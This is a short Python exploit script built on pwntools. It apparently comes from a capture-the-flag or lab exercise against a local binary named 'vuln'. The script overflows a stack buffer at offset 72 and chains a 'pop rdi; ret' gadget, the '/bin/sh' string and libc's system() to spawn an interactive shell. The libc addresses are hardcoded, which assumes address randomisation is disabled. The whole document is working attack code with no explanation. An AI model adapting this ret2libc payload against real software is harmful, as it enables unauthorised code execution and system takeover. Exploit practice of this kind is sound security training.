#!/usr/bin/python
from pwn import *

def main():
	delay = 0.2

	io = process("./vuln")
	io.recvrepeat(delay)

	offset = 72
	
	# 0x7ffff7a52390 <__libc_system>
	# 0x7ffff7b99d57 ('/bin/sh')
	# 0x0000000000400673 : pop rdi ; ret

	sys = 0x7ffff7a52390
	bin_sh = 0x7ffff7b99d57
	pop_rdi = 0x0000000000400673
	
	payload = "A" * offset
	payload += p64(pop_rdi) # Pop /bin/sh below to rdi(1st arg)
	payload += p64(bin_sh) # To be popped to RDI
	payload += p64(sys) # system("/bin/sh")

	raw_input(str(io.proc.pid)) # Debug

	io.sendline(payload)
	io.interactive() 	

if __name__ == "__main__":
	main()
